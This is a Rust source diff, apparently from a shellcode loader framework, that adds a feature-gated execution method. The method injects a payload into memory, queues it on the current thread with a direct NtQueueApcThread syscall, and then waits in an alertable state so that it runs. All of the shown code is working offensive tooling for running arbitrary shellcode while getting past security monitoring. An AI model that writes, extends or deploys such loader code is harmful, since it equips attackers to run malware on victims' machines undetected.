@@ -1433,3 +1433,55 @@ pub fn shellcode_execute_flsalloc(payload: Vec<u8>) -> bool {
         Err(_) => false,
     }
 }
+
+// =======================================================================================================
+// EXECUTION METHOD: WaitForMultipleObjectsEx APC   
+// =======================================================================================================
+
+#[cfg(feature = "ShellcodeExecuteWaitForMultipleObjectsExAPC")]
+use windows_sys::Win32::{
+    Foundation::CloseHandle,
+    System::Threading::{CreateEventA, WaitForMultipleObjectsEx}
+};
+
+#[cfg(feature = "ShellcodeExecuteWaitForMultipleObjectsExAPC")]
+use rust_syscalls::syscall;
+
+#[cfg(feature = "ShellcodeExecuteWaitForMultipleObjectsExAPC")]
+fn alertable_function3() {
+    unsafe {
+        let mut h_event = CreateEventA(null(), 0, 0, null());
+        if !h_event.is_null() {
+            // Wait for 30 seconds (30000 milliseconds) in an alertable state
+            WaitForMultipleObjectsEx(1, &mut h_event, 1, 30000, 1);
+            CloseHandle(h_event);
+        }
+    }
+}
+
+#[cfg(feature = "ShellcodeExecuteWaitForMultipleObjectsExAPC")]
+pub fn shellcode_execute_waitformultipleobjectsexapc(payload: Vec<u8>) -> bool {
+    match inject_shellcode(&payload) {
+        Ok(start_address) => {
+            unsafe {
+                // Get current thread handle
+                let current_thread: isize = -2; // HANDLE to current thread (pseudo-handle)
+                
+                // Queue the APC to execute the shellcode using syscall
+                let _status: i32 = syscall!(
+                    "NtQueueApcThread",
+                    current_thread,
+                    start_address,
+                    0usize,
+                    0usize,
+                    0usize
+                );
+                
+                // Enter alertable wait state to execute the APC
+                alertable_function3();
+            }
+            true
+        }
+        Err(_) => false,
+    }
+}
